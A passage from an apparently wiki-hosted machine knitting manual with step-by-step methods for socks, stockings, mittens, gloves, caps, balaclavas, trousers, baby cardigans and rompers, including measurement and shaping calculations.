When you have finished the socks, and you find that you have knitted them too short or too long and have to ravel them up again, you have the problem that you don't have the contrast coloured yarn to keep the stitches from running down or to show which row you are going to pick up. After many troublesome experiments, I found this as the most secure way: At first you iron the socks with wet cloth on the last part of the foot on both sides. Count the rows down to the place where you are going to ravel up and place a pin. Take the nylon thread that belongs to the machine (or another smooth tread in a different colour) and then sew by hand into all the stitches in the row in question, so that it can be seen both on the wrong and the right side. After that, ravel up down to the thread and pick up the stitches in the row beneath it, so you don't cannon against the nylon thread. When you are sure that all the stitches are on the needles, you can pull out the nylon thread, and ravel up one row and knit it again. Remember to set the row counter.

===Method 1===
====Flat knitted socks====
If you have no ribber, you can knit the socks flat.
Say we cast on 60 stitches. Start with a hem and knit the leg to the desired length.

====Heel====
Push 30 needles in one side into the idle position and knit on the rest of the needles. Push one needle at the end of each row until there are 10 needles in the idle position on each side and 10 stitches left in the middle of the half row. Now you have reached the bottom of the heel. Put back the row counter to 0 and hang a side weight under the 10 middle stitches. Then push the needles down again, one at a time, and at last also the 30 needles in the other side. Knit until the row counter shows 20 rows before the foot length.

====Casting off the foot====
Push 30 needles in the resting position in the opposite side of the heel. Knit the toe in the same way as the heel. When all needles are down again, you knit in contrast coloured yarn and take off the knitting. A row of holes will appear at the end of the toe. If you want to avoid this, you can knit one or two rows at the end of the toe. You can do this by pushing down the needles you use for the toe, knit one or two rows over them, and push them up again before you take them down one at a time.

Press the socks solid, ravel off the contrast coloured yarn, bend the sock and sew the under part and the over part of the sock together in the open stitches. Lastly, you sew the sock together in the side (It is described in the [[Machine_Knitting/Edges|edges]] chapter how to do this).

===Method 2===
====Socks with pattern====
If you want to knit a pair of socks with a pattern which continues on the upper part of the foot, you can knit the overfoot and the underfoot in continuation instead of besides each other. The pattern requires its own knitting sample. And besides that, you must have a plain knitted sample for the underfoot. Knit the foot in the middle, and knit contrast coloured yarn on the outermost quarter of the needles in both sides. Set the row counter at 20, which is the number of rows you use for the heel. Continue knitting the pattern on the 30 middle stitches. Stop the pattern knitting 20 rows before you reach the foot length, and use the plain knitted sample for the rest. Cast off the toe by pushing one needle in the idle position at the end of each row, until you have 10 needles in the idle position in each side, and 10 needles left in the middle. Knit one or two rows on all needles and push them up again to where they were. Set the row counter at 0, and push one needle down again in the end of each row. Knit until 20 rows before you have reached the foot length, and then knit the heel in the same way as the toe. Knit in contrast coloured yarn and take the knitting off. Iron both the foot with contrast coloured yarn and the two little parts in the side. Ravel off he contrast coloured yarn and sew the loops on the leg and the foot together. Sew the foot together in the sides.

==Knee stockings==
At first you make an ordinary sample and measure it. Afterwards you expand the sample in the width approx. 10 % (as explained in the [[Machine_Knitting/Knitting_samples|knitting samples]] chapter), and use that for the legs. Use the ordinary sample for the feet.

Measure around the leg just underneath the knee and just over the ankle. Measure the length from the knee until just under the anklebone. Calculate from the expanded sample how many stitches and rows you have to use. Calculate the stitch number both at the knee and at the ankle. Cast on the stitch number at the knee and begin either with a hem or a rib border starting with the racking method. Divide the length into three. Knit one third of the length straight out, one third for the decreasing, and one third straight out again. The number of stitches to decrease in the middle piece is the difference between the number of stitches on the knee and the number of stitches on the ankle. To calculate how many rows to knit between each decreasing, divide the number of rows in the middle piece by the number of stitches you are going to decrease. However, to avoid that the transition to the decreases becomes too abrupt, you begin a little before the middle piece with one or two decreases with greater distance between them, and you do the same after the end of the middle piece. Then you knit straight out to the ankle. Now use the ordinary sample. Knit the foot as described in method 2, where you knit the over and under foot in continuation. Otherwise the seam with the decreasing will not stay on the back of the leg, when you sew it together.

===Circular knitted knee stockings===
Use the expanded sample for the leg and the normal sample for the foot. You can either begin with a hem or with a rib border. If you begin with a rib border, you cast on with the racking method (see [[Machine_Knitting/Edges|edges]] chapter). Knit the desired number of rows and transfer the stitches to the back needle bed. Knit one or two rows plain with the stitch size you are going to use for the circular knitting, and knit in contrast coloured yarn. Take off the knitting and the comb. Iron it solid with steam or a wet cloth on both sides. Fold the knitting on the middle so that it becomes double-layered; the rightside must turn outwards. Push the comb through both layers and place it between the front and the back needle bed. Let down the ribber one step. Pick up the backstitches on the needle hooks on the knitter, not behind the latches. Hang a weight on the middle of the comb. Raise the ribber one step and pick up the front stitches on the ribber. Ravel off the contrast coloured yarn. Now you knit in the same way as the flat knitted stockings, but decrease only in one side on both the ribber and the knitter. Use the tool with two transfer tools.

When you have finished the leg, you must move the comb again. Knit in contrast coloured yarn and iron it solid. Now you get, very conveniently, a fold in the middle of the hind part, which will guide you when you place the fold in the middle of the knitter, so you can knit the heel there. When you place the stitches again, you use the same method as described for socks. Knit a few turns before you knit the heel and the foot in the same way as described for socks. Use the ordinary sample for the foot.

You can choose to knit the legs on the ribber. Then you must sew them together afterwards. Instead of decreasing on the middle part of the legs, you can begin with a big stitch size and gradually diminish it.

==Mittens and gloves==
[[image:MachineKnittingFig6-2.gif|frame|right|Fig. 2]]
You can make mittens either circular knitted or flat. However, if you want a pattern on the mittens, you have to knit them flat. You can make a gore for the thumb or just knit straight out.

'''Measurements:'''

# Round the hand just over the thumb. If the mittens are going to have a pattern, then you must calculate a little extra, because the threads on the wrongside take up space.
# The length from the wrist to the finger tips.
# From the wrist to the beginning of the thumb.
# The length of the thumb. It starts at the bone just under the thumb.
# If you knit gloves, you must measure where the fingers begin and how long they are.

Don't measure too tightly, neither in the width nor the length, because then the mittens will not be so warm.

You can begin with a rib border for the wrist, and do not make it too short. If you have no ribber, you can make a hem.

===Method 1===
[[image:MachineKnittingFig6-3.gif|frame|right|Fig. 3]]
If you don't want a gore for the thumb, you knit straight up to the thumb. Then knit contrast coloured yarn by hand on a little more than 1/3 of the palm of the hand (look at the picture). When you have finished the mitten and ironed it solid, you can pull out the thread and pick up the stitches, which appear both over and under the thread, plus two or three loops in the innermost part of the thumb.

===Method 2===
If you want a gore for the thumb, then increase one stitch in the beginning of each row in both sides. If you have a normal ratio between stitches and rows, then you will get an angle of 35° relative to vertical; and the combined number of stitches from both gores fit roughly with the width of the thumb. However, if you are knitting a pattern, you may have another proportion between stitches and rows, and that means that you are going to increase more times (find out by using the angle table). Knit contrast coloured yarn on the extra stitches and go on with the mitten.

When you have finished a mitten, you must fold it together so the end of the two gores lie next to each other, so you can knit the thumb. You can cast off both the mittens and the thumbs in the same way as described on flat knitted socks.

===Gloves===
It is most practical to knit gloves with circular knitting. Otherwise you will have too many seams to sew afterwards.

Begin with a rib border. Cast on a number of stitches that can be divided by 8. The rib border must be fairly long in order that it can be reversed. When you have finished the rib border, you move the stitches to the knitter, and knit one row at the stitch size you are going to use for the circular knitting. Knit a few rows of contrast coloured yarn, and take off the knitting. Iron it solid on both sides and take off the comb. Bend it on the middle and push the comb through both layers. You only need one weight on the middle of the comb. Let down the knitter and place the back layer on the knitter by pulling the needles through the stitches behind the contrast coloured yarn, and be careful not to pull them behind the latches. Push up the ribber one step and place the front stitches at the ribber. Pull the needles to the same height as the needles on the knitter, but not behind the latches. When you are sure that all the stitches are placed on the needles, you push up the ribber while you keep the needles down by hand, so they don't slip behind the latches.

Now you use the measurements from figure 1, and calculate them to stitches and rows from your sample. If you don't want a gore, you knit straight up to the thumb. Knit one thread of contrast coloured yarn by hand on the stitches you need for the thumb, and then go on knitting up to the fingers. If you want a gore, you begin to increase in one side on both the ribber and the knitter for every turn. But the increases must be made at least two stitches away from the edge, picking up a loop on a free needle, otherwise you will get holes. You can knit the thumb now, or you can leave it with contrast coloured yarn and knit it after you have finished the glove.

If you knit it now, you only use the stitches from the gore plus 2 stitches from the hand. Push the rest of the needles both on the ribber and the knitter in the idle position and be sure that both machines are set right. You knit the thumb in the length you have calculated from your sample minus the number of rows you are going to use for casting off. That depends on the number of stitches. You cast off the 4 outermost stitches for each row, and pull a thread through the last stitches.

When you have finished the thumb, you pick up two extra loops from the thumb to the hand, so you still have the same amount of stitches. If you leave the thumb with contrast coloured yarn until you have finished the rest of the glove, you must pick up two extra stitches from the glove.

When you reach the fingers, you use a quarter of the stitches on both the ribber and the knitter for each finger. Begin with the little finger. It will get two stitches less than the other fingers. Push the rest of the needles into the resting position, and be sure that both carriages are set right. Some rib carriages have to be adjusted in both sides. Knit a few turns on the little finger before you hang a weight on; then you have a space to place the claws. You must have both a claw in the front and in the back of the finger, and hang a weight on both of them. When you have finished the finger, you cast off the outermost stitches in each side until you have 4 - 6 stitches left. Cut off the yarn and pull the end through every stitch. When you start the next finger, you must push the needles down by hand, and use the latch tool to place the stitches in front of the latches, otherwise the machine will knit the first row in rib, because the idling buttons are in working position. Pick up two loops from the little finger. This makes the other fingers have two more stitches than the little finger. Move the weights to the finger you are knitting now. Knit the other fingers in the same way, and pick up two loops from the last knitted finger. For the last finger, you can remove all the weights and just hold the glove a little down by the hand.

If you have knitted a gore for the thumb and have already knitted it, you have now finished the glove. If you have not knitted a gore, but just placed a thread of contrast coloured yarn, you iron the glove solid and pull out the excess thread. Let down the ribber one step, fold the glove and place it between the two beds. Place the upper stitches on the knitter and the stitches below on the ribber. Pick up two loops in each side. Hold the glove down with one hand while knitting with the other hand. You can cast off in the same way as you did on the other fingers.

==Caps==
===Measurements===
[[image:MachineKnittingCap.jpg|right]]
Measure the circumference of the head behind the ears, but calculate a little less than this measurement, because a cap has to be a little tight so that it does not fall off.

Measure the head height from the earlap in one side, over the head and to the earlap in the other side. Use half of this measurement.

You can furthermore calculate an extra piece to bend up. Make a sample with the pattern you want to use.

===Quickly knitted cap===
Cast on the circumference of the head minus 15 - 20 % and begin with a rib band or a seam. If you have no ribber, you can make a fake rib, as described in the [[Machine_Knitting/Edges|edges]] chapter. If you use fake rib, you shall not make it less than the head circumference. If you have a ribber, you also have the possibility to use English rib. Anyway, you knit straight up until you reach 10 rows before the head height. Then you knit the last 10 rows on every other needle and with half stitch size. If you have knitted English rib or ordinary rib, you transfer the stitches to the knitter to the needles that already have stitches, so you knit two stitches together. When you have finished, you cut the thread and leave a piece which is long enough to pull it through all the stitches, and pull them tight together. Fasten it well.

===Sideways knitted cap with shortened rows===
When you knit a cap sideways, you shall not knit it less than the circumference of the head, because it will not expand so much in the length.

Cast on the height of the head with a closed edge, so the cap can be sewed together in the end. Then knit shortened rows as follows: Push a little less than half of the stitches, opposite the carriage, into the idle position and knit one time forwards and backwards. Then push further approx. 1/10 of all the stitches into the idle position. Next time you push two stitches at a time, a few times, and then push the rest of the stitches up one at a time. When all the stitches are in the idle position, you start over again.

If the result deviates strongly from the number of rows that has been calculated for the head width, you may change the layout of shortened rows somewhat. But for the last many rows, only one needle must be pushed into the idle position at a time, because the cap has to be fairly flat on top.

The edge at the bottom will of course roll, so a rib band is necessary. If you have no ribber, you have to knit it by hand, because the cap can hardly be stretched so much that you can pick up stitches along the edge. If you knit it by machine, you must knit it separately. Make a little rib knitted sample to find how many stitches to use for the head width, as described in the [[Machine_Knitting/Edges|edges]] chapter for selvedges. When you have knitted the edge, you leave it on the machine and take off the weights and the comb. As you cannot stretch the cap's edge very far out, you have to tuck up half of it at a time, i.e. you tuck up the center of the cap's edge at the two 1 needles and one half of the edge on half of the rib stitches. Hang a side weight on the side and close both layers at a time. When you approach the middle, you can tuck up the rest of the cap's edge and cast off all stitches. Only when you have knitted the rib border, can you sew the cap together. You use the open loops in one side and the closed edge in the other side. It is described in the [[Machine_Knitting/Mounting|mounting]] chapter how to sew open loops together.

===Beret===
A beret can be knitted sideways too. You can cast on the head height or a little more if you want. You can partition it like this: 2/3 will become the radius of a circle on top of the head and 1/3 will become an edge, which is bent a little inwards. Finally, you make a rib band separately. But the circle and the last 1/3 is knitted as one piece. You can for instance make the partitioning at the 1 needles. If the head height is 20 cm, you can partition it so that 14 cm are to the left side and 6 cm to the right side (this partitioning is made with regard to the row counter). The 14 cm will be the radius in a circle and the 6 cm will be the edge that is bent inwards. Multiply these two figures by the number of stitches per cm known from your sample. The circumference of the circle is 2 × 14 cm × 22/7 = 88 cm. Then 88 cm must be multiplied by the number of rows per cm to tell you how many rows you have to knit.

Cast on with a closed edge. Do not hang a comb with weights on, because then the innermost stitches will be pulled long and loose. At the circle piece in the left side you push one needle at a time into the idle position, and one more on the way backwards. When all needles until needle number 1 in the left side are in the idle position, you knit one row across them all and start over again. But in the right side you only make shortened rows for every time you start a new track. You must calculate how many shortened rows you have to knit at a time to reach the correct head width at the bottom. If for instance the head circumference is 60 cm, this is 28 cm less than in the circle which is 88 cm. How many tracks you are going to knit, depends on how many stitches make out a radius. It will most likely fit with 10 tracks, but you cannot be certain that this fits with the number of rows that you have calculated for the circumference, but that does not matter, because these figures are only approximate. But you can se when the knitting has become completely round, and even when it is not, you may think it is OK that it arches a little.

When you have finished, you knit in contrast coloured yarn and drive off the stitches.

Before you sew the cap together, you must knit the rib band, in the same way as described above for a sideways knitted cap.

A little hole will appear in the middle of the cap. Pick up 5 - 6 stitches in the edge of the hole, and knit a little end, one stitch size less than in the cap. Knit 6 - 8 rows and cast off very tight. The end will roll by itself, but you may sew it together with the end of the thread if you want.

At last you iron the edges, ravel off the contrast coloured yarn, and sew the open loops and the closed edge together, as shown in the [[Machine_Knitting/Mounting|mounting]] chapter.

===Balaclava===
Cast on half a head width. Begin with a rib band or a seam, and knit 10 - 12 cm, or as long as you want the neck to be. Read the row counter, and then begin to round the edge with shortened rows for the face to make it curve downwards in the middle. Draw a curve on a piece of paper, on which you note how many needles to push into the idle position at a time, so that you can do it in the same way on the other side. Start with half of the needles in the idle position. At first you push many needles up in the middle, and gradually you diminish the number of needles for every row, as you approach the side. Right out at the side there must remain a short piece that is not rounded. When you have finished one side, push all the needles down and knit one row. Put the row counter back to where you started the curve. Now make the curve on the other side in the same way as you noted on the paper. You can cast off the curve; it will not roll because it is round. Or you can knit in contrast coloured yarn, and later knit a rib band.

Cast on new stitches on the empty needles, either with a closed edge, or loose stitches with a thread through them. You may knit a few rows with a seam before you pick up the side stitches, or you may later pick them up to make a rib border. Put the row counter back to 0, and knit the head height minus 2 - 3 cm. Out of this, 2/3 are knit straight upwards, and 1/3 rounded with shortened rows like this: Push one needle at a time into the idle position in the end of each row. In the last two rows, you push at first 2 needles and then 5 needles into the idle position. The needles that still remain when you have reached the head height, are left. They will make out 8 - 10 cm (for children it should be slightly less).

Note the number on the row counter and put it back to 0. Now you knit the backside of the cap. At first you push down the needles in the opposite sequence, and then knit straight down to the same row number as on the front side. First the head height, then the curve height and then the neck height, and finally the rib band or seam. If you want, you can pick up stitches in the hole for the face and make a little rib band there. In the upper edge it is actually necessary, but you can omit it along the curve.

You can knit the cap without making a curve for the face, but instead knit a thread by hand on the middle piece. When the cap is finished, you iron it, pull the thread out, and pick up the open loops and knit an edge on it. But it is not as comfortable as if you make a curve.

When my sons where young, it was the fashion to have a shade on balaclavas. I cut a shade out of a plastic lid. Above the eyes, I picked up the edge stitches and used them for knitting a shade covering. I rounded it with shortened rows, put the shade inside and seamed the stitches on the wrongside.

==Trousers==
===Briefs===
Measure the hip circumference where it is largest, but close to the body.
Measure from the waist to the groin.

Measure the seat height, while you are sitting, from the sides of the waist and down to where the buttocks touch the chair.

Measure how wide you want the piece between the legs to be.

First make an ordinary knitting sample, and measure it as described in the [[Machine_Knitting/Knitting_samples|knitting samples]] chapter. Note the measurements. Next, stretch the sample to enlarge it by approx. 25 % and pin it up along all sides. Note the measurements.

[[image:MachineKnittingFig6-4EN.gif|frame|right|Fig. 4]]
Begin with a seam, or allow for an extra piece for seam and sew it afterwards. Knit according to the enlarged knitting sample until you reach the groin (i.e. where you start decreasing for the legs). Set the row counter at 0. From this point, you knit according to the ordinary knitting sample. Decrease until the needle number that you have calculated from the ordinary knitting sample. If you start in front, you cast off e.g. 6 stitches a few times, and then 3, 2 and finally 1 stitch at a time. Of course it depends on how large a stitch size you have, but usually, briefs are not thick. Instead of casting off, you may also put needles into idle position and cast them off all at once, until you have come to where you cast off only 1 at a time. When you have come so far that you have reached the calculated distance between the legs, you knit straight ahead, until you have made the number of rows that was calculated from the groin to the seat height. Set the row counter at 0, and now you knit the same number of rows on the backside. First a short straight piece. Next a piece where you increase 3 or 4 at a time. Now begin to make shortened rows, only 2 at a time, with 2 or 4 rows in between. Put only the outermost 3 - 4 stitches in idle position, also when you have increased. At the same time, you still increase 3 - 4 stitches at the beginning of each row; and when you have come halfway to the groin, you increase only one at a time. In order to have a less abrupt transition, you may increase by 2 a couple of times before that. How many times you shall make shortened rows, depends on how finely or coarsely you knit. Calculate with at least 4 cm, depending on the size. Go on with increasing one stitch at a time, until you have reached the same row number and stitch number as in the front. You may, at a pinch, increase the last stitches in one turn, if you are unable to reach the required needle number in the course of that number of rows that you use. Remember not to count in the shortened rows.

Now, set the row counter at 0, and go on guided by the enlarged knitting sample, the same length as in front, and again allow rows for a seam, or hang in the comb before you start on the seam, and finally hang it up on the needles and cast off loosely.

Before you sew the trousers together, the trousers' legs must have some kind of edge. If you have knitted with fine yarn, you may make a rib border on every needle, and sew it on with a machine with zigzag. If you do not have a ribber, you may pick up stitches and make a seam, which you seam on the other side of the edge, or maybe you choose to crochet a border, or just sew on a bias strip. You may also knit a ribbon and sew it on like a bias strip, i.e. bend it around the edge, and sew it on with zigzag. If you make a rib border on every needle, you have to make a small knitting sample. It needs be no larger than you can just use a side claw with a little weight in it. It is not to be cast off, but just knit e.g. 16 rows, knit in contrast coloured yarn and drive off the stitches. Fasten it with pins on an ironing board, and pull it out to the length of the selvedge. You can use it at once.

I have presupposed that you are using fine yarn when you knit briefs. But if you use thicker yarn, you can of course pick up stitches and knit the rib border on every other needle.

===Overall trousers===
'''Measurements:'''
# Hip circumference at the broadest place, but a possible belly is not included.
# Seat height in sitting position, from the sides of the waist and down to where the buttocks touch the chair, i.e. to a point a little bit inwards from the sides of the buttocks.
# Trouser leg length, from the crotch and as far down as you want the trouser legs.
# The thigh circumference at the upper end of the trouser leg.

Use an expanded knitting sample all the way.

Knit two pieces that correspond to each other as mirror images. The width above is to be half of the hip circumference. But it gives the nicest result to begin at the lower end with a rib border or a seam.

Cast on the hip circumference. Increase regularly in each side until you reach 1/2 hip circumference + 3 - 4 cm for the gore. How frequently you increase, is calculated by dividing the row number from the bottom up to the crotch by the number of stitches that should be increased in each side. Or, if you have drawn a pattern, use the angle table.

Set the row counter at 0 again. Now you are going to knit the length of the seat height up to the waist. At the same time, you decrease for the gore (3 - 4 cm) until the knitting is as wide as half the hip circumference. Start out with casting off a few stitches in each side. Then cast off one stitch at the beginning of each row a few times. At the same time, you begin to make 2 shortened rows at a time in one of the sides (on the back). These have to slope towards the middle of the machine, with 4 to 6 rows in between, and for every time that you have made shortened rows, you set the row counter two numbers back. The first time, most of the stitches have to be set in idle position, and the next times, fewer and fewer, until you end near the middle. Those turns where you make shortened rows, you don't decrease on the back. Thereby, the gore on the back becomes a little more elongated. This gives you more width.

When you have decreased for the whole of the gore, and you have finished with the shortened rows, you go on straight ahead, till you reach the waist. Here, you can either knit a few extra rows and sew a seam, or you can hang in the comb, knit a piece twice as broad as the seam, and hang the stitches from the comb up on the needles, and cast off loosely, e.g. by knitting the stitch an extra time for every time you cast off.

If you want to hang in the comb to knit a seam, it can be done in the following way: Fasten the comb in the gate and push up every other stitch. Push the idling button and set the stitch size at zero. Knit one row while you hold the comb in a position slightly slanted towards the machine, so that the carriage will not run against it. Detach the comb from the gate and pull it down. Push the idling button and set the stitch size. Knit twice as much as the width of the seam. Now, the comb is to be hung up on the needles. Push again every other stitch up, preferably only into idling position. For safety's sake you may lay the elongation bars in between, before hanging the stitches from the comb up on the stitches that are in idling position.

If you have knitted the overall trousers with fine yarn, and then begin to make rib on every other needle, it will probably become too loose. But when you use an expanded knitting sample, it will become expanded anyway, so this is acceptable, especially if you have the possibility to set the machine for tight rib. Otherwise you must knit the rib on every needle, knit in contrast coloured yarn, and drive off the stitches. But in this method, you cannot be sure that the border may be stretched as far out as the double needle number, when you go on knitting plain knitting. At any rate, you must knit with a larger stitch size than in the plain knitting. Instead of this, you may use loose casting on, and perhaps crochet it on. Further, there is the possibility to begin with circular knitting and make a seam in that way, and afterwards transfer the stitches of the ribber to the knitter. If you are so lucky that you have a garter carriage, you can knit the border with that. But if you do not have a ribber, you must start with a seam instead.

===Overall trousers with a gore sewn in===
Make a knitting sample in rib on every needle. Fasten it on an ironing board. Stretch it so much that the selvedge is smoothed, but not tightened. Fix with pins all the way around. The sides will be longer than the midline, so you cannot measure the length here. The midline will be too short; but halfway between the midline and the side, where it starts to curve downwards, will perhaps make the best fit, for it had better be a little too long than a little too short. The sample may be used at once.

Knit two straight pieces 1/2 hip circumference wide. The length shall be trouser leg's length plus seat height. Start from below. When you have reached the trouser leg length, a strand is put as a mark in each side. It is from here and upwards that the gore is sewn in. Knit on until you have reached the whole length. Knit in contrast coloured yarn, and drive off the stitches.

Next, you knit the gore with plain knitting: Cast on 4 stitches, and knit 2 rows. Increase 1 stitch at the beginning of each row until the gore is 6 - 8 cm wide. Knit 4 - 6 rows, and now decrease in the beginning and end of every 4'th or 6'th row until 4 stitches remain. Cast off.

Sew together the trouser legs up to the mark. Then sew on the gore. Start at the broadest part of the gore, and sew it so that the two short sides will be on either leg. The middle of the gore is to be at the mark, and the tips must be up. Turn the trousers around, and sew the two long sides of the gore on either leg. Sew the trousers together in the middle of the front and in the middle behind.

Put on the trousers, and fasten pins along the waist all the way around. Sew a zigzag border or multi-stitch zigzag approx. 2 - 3 cm above the pins. Cut off with caution, so that you do not cut into the stitches. Sew an extra time, before you bend down the seam and sew it on. Make a little opening for the rubber band.

==Cardigans==
Of course, you can knit a baby cardigan in the same way as you knit one for adults, with or without armhole. But there are many other ways to do it, quick ways as well as slower ways. Here I will show some examples:

===Quickly knitted cardigan in one piece===
You begin at the bottom and cast on the measurement of the chest circumference. The sides are the middle of the front. Knit straight up to the armholes. Knit in contrast coloured yarn on 1/4 of the stitches in both sides and release the knitting; but you have to knit the outer 1/4 of the stitches before you enter the contrast coloured yarn; otherwise the thread will not be where you need it. This part will become the lower part of the front pieces, which are later bent around to the plain side and stitched upon the upper part of the front pieces.

[[image:MachineKnittingFig7-1EN.gif|right|thumb|276px|Fig. 1]]
Put the row counter back to 0, and cast on new stitches for the sleeves with closed casting. There must be slightly more new stitches than you had for the front pieces.

If you want, you can slope the underside of the sleeves with shortened rows, thereby making the sleeves narrower at the bottom. It will fit if you push 3 or 4 needles in the idling position at a time. When you have finished the sloping, you must note the row number, so you can make the same number of shortened rows on the other side of the sleeves. At the bottom of the sleeves you can increase one stitch, say for every fourth row, as you see in the picture. When you reach the middle of the sleeve you increase one stitch again for every fourth row, but at the same time you have reached the back of the neck in the other side. You cast off the stitches for the neck or knit in contrast coloured yarn. Then push the stitches on one side in the idling position and knit each side separately. Note the row number, so you can begin on the same row when you are knitting the other side. Finish one sleeve at the same time as you make the front neck. Knit a few rows straight and then decrease one stitch a row a few times and then cast on the rest of the stitches to the middle of the cardigan. Knit straight up in the neck side until you have finished the sleeve. Knit in contrast coloured yarn on the front piece separately and the sleeve separately.

When you have finished both sides, you remove the knitting from the machine. Iron the edges, bend the bottom pieces of the front, sew the open loops together with the upper part of the front as shown in the [[Machine_Knitting/Mounting|mounting]] chapter, and sew the sleeves together by sewing the open loops together with the cast on loops.

You can crochet an edge on the neck and front, or pick some stitches up and make a rib border with buttonholes.

===Cardigan with a round yoke===
[[image:MachineKnittingBabySweater.jpg|right]]
You can knit a round yoke transversely, by knitting shortened rows. You may knit a pattern on the lower end. Choose a coloured pattern which is equal in both directions.

Calculate the neck circumference to about 25 cm, using your knitting sample to find the number of rows per cm. This is half of the rows you are going to knit, because you make shortened rows twice so that only the bottom piece has a pattern. On some machines, the neck piece will get small stripes, because you push the needles down from the idling position to the C position and the coloured yarn will knit the needles in C position, but only at the return strokes, so the stripes come on every second row. Knit until the row counter has reached twice the length which you calculated for the neck. Then cast off.

[[image:MachineKnittingFig7-2EN.gif|right|thumb|276px|Fig. 2]]
Now the yoke is partitioned like this: 1/8 for each front piece, 1/4 for each sleeve and 1/4 for the back, and mark it with pins or tack marks. It is probably easiest to start with the sleeves, because here you need not knit shortened rows. Pick up stitches in the edge of the yoke. Make a stitch in the beginning of each row, until you have the amount of stitches that you have calculated for the upper arm circumference, and then increase one stitch for every fourth row in each side until you have reached the sleeve length. If you are not sure about the sleeve length, fold the yoke and measure, from the middle of the back, the length NS, and make a mark. Measure the piece from that mark and till the end of the yoke; this piece must be subtracted from the sleeve length. The line in the middle of the picture shows NS, from which you can measure the sleeve length. You may finish the sleeve with a rib border.

At the front pieces and at the back, you must start rounding the piece so it suits the rounding of the yoke, when you have picked up the stitches from the yoke. At the same time you pick up a stitch from the sleeve in the side, or you make a stitch, until the sloped piece has the same length as the piece at the sleeve. When you have finished the decreasing, you put the row counter back to 0. Knit straight down to the same row number on the back and the front pieces, and finish with a rib border. Knit neck border and front borders in rib and make buttonholes in one side.

===Sidewards knitted cardigan with shortened rows===
Start making a front border either by rib knitting or by making a seam. You can knit buttonholes at this border or wait until you have knitted the whole cardigan and come to the other front border.

Now you knit shortened rows in series of three. The bottom piece must be the longest, maybe as long as the two other pieces together, or a little shorter. Push the needles from the two upper pieces into the idling position and knit one time forwards and backwards, then push the needles from the middle piece down and knit once more; and at last you take all needles down and knit the whole way over. Continue knitting three times forwards and backwards, first the bottom piece, then the bottom and the middle piece, and then the whole way over, until you come to the sleeve. Then you knit the bottom piece once, so the thread stays there. Place the bottom piece stitches on a safety pin or on a transfer tool comb with a rubber band to halt the stitches. Now you cast on new stitches for the sleeve. Knit the sleeves the same way as the front piece, but leave a few stitches for the wrist and knit them the third time together with the neckpiece. If you find that this is too tight, you can knit it only every second time, or whatever you think is suitable. The sleeve must be as wide as twice the armhole depth, which you calculate from your knitting sample. Now you can pick up the loops from the casting-on edge and place them on the needles. Cast off the whole together. In this way the edge will appear on the plain side, but under the arm. If you don't want that, you can knit in contrast coloured yarn and sew the open loops together later, but make sure that you finish under the arm. Now take up the stitches from the safety pin and continue the knitting in the same way as for the front piece until the back is twice as wide as the front piece. Knit the other sleeve in the same way as the first sleeve, and then knit the other front piece. Finish off with the other front border, and buttonholes if you did not make them on the first front border.

The neck requires a border too, either a rib border or a crochet border with holes for a string, otherwise it becomes too large. Likewise, the bottom edge and the wrist edge must have a crochet border, otherwise they will roll.

===Knitted string===
Cast on 2 - 3 stitches and knit as long as you want. Hold the starting thread lightly, at least in the beginning. The string will roll by itself.

==Rompers==
[[image:MachineKnittingMark.jpg|right]]
Knit two pieces that are laterally reversed.

If you want to avoid a seam in the middle of the front and the back - e.g. if you want to make a pattern on the belly - you may proceed as follows: Cast on half the hip circumference for the front. Start at the crotch with contrast coloured yarn in two halves divided at the middle. Thereby you can knit upwards in the pattern that you want, and need not knit the pattern from above, which not all machines can do automatically. Knit until you reach the armhole, cast off a few stitches, and increase one stitch in the beginning of each row. Finish with a rib border or a seam and make a buttonhole in each side. Knit a back piece in the same way, but leave a few stitches in each side for shoulder straps and place them on a safety pin. The sloped edge will not roll, so it is not absolutely necessary to make a crochet border.

[[image:MachineKnittingFig7-3EN.gif|right|thumb|276px|Fig. 3]]
Now, take half of the stitches from the front and half of the stitches from the back, so the middle of each piece will become the side of the trousers' leg. Then you are going to decrease for the gussets. Calculate 1/12 of the hip circumference (including nappy) for the gusset in front and 1/8 for the gusset in back, which must be bigger. You do that by sloping the back half with shortened rows, while the needles in the front are staying in the idling position. This will fit because the trousers have to be higher in the back anyway.

Put half of the needles in idling position. This will become the front side. Increase one stitch at the start of each row on the back. On the front you activate a few needles for every row, and one extra stitch at each return stroke. Knit as many shortened rows as corresponds to the number of extra stitches in the back gusset relative to the front gusset. When all stitches have become included, you begin to increase one stitch at the start of each row in the front as well, still increasing also on the backside, i.e. you increase one stitch at the start of every row. If you increase e.g. 8 stitches in the front gusset, and you have made four shortened rows in the back, you will now have to increase 12 stitches in the back gusset.

Now we are going to knit the legs. You may decrease a few stitches before you knit the legs straight downwards. Thereby you get a flat piece where the nappy can lie. Decrease by equal space until you have the leg length and the ankle width. You can decrease a little more in the back until you have the same needle number in each side. Finish with a rib border or a seam.

If you want to knit feet, you can make a row of holes, so you can pull a string through. See in the [[Machine_Knitting/Other_garments|other garments]] chapter how to knit the feet.

'''Shoulder straps:''' You can knit shoulder straps on the back needle bed by using the tuck buttons. Push every second needle in C position, knit one or two rows, and put the opposite needles in C position, etc. This knitting will not be liable to roll. Ordinary rib knitting will stretch too much, which all long and narrow pieces will do, but not if you do as described.

Naturally, you may also begin the rompers from above and knit until you reach the gusset. From there, you must knit in contrast coloured yarn divided into two pieces, and proceed as described above.

===Rompers with a seam in front and back===
Begin under the arms and make a seam or rib border with a row of holes. Knit two laterally reversed pieces. When you reach the crotch, you push the front needles in the idling position and knit shortened rows on the back piece while you decrease one needle in the beginning of each row. When you have finished the shortened rows, you knit the whole way over and decrease in both sides, so that the gusset gets bigger in the backside than in the front side. You can then increase the stitches from the gusset again, or only some of them, and knit the legs straight down or slope them.

When you have knitted the two halves and sewn them together, you can pick up stitches from the upper seam if you want, or just use the trousers alone.

If you knit a flap, then do not make it too wide, as it will fold. You can increase and slope it, so it is not too wide at the neck. Finish with a rib border or seam, and remember buttonholes. On the back, you can either make a flap that is similar, except that it has shoulder straps, or shoulder straps may be fixed just by picking up stitches on the back seam. If you have buttonholes in the front and buttons on the shoulder straps, you can make the shoulder straps a little too long, so you have the possibility to move the buttons when the baby has grown. You can pull a string through the seam, or for bigger babies a rubber band.

Furthermore, there is the possibility to start at the bottom of the legs with a rib border. The leg length is calculated from the widest part of the gusset. If you do not want a seam in the middle of the front and back, you can knit in contrast coloured yarn on two pieces, and when you have knitted the other leg, you can proceed as described above.

==Patterns with single bed machine==
[[image:MachineKnitting-Chicken.jpg|right]]
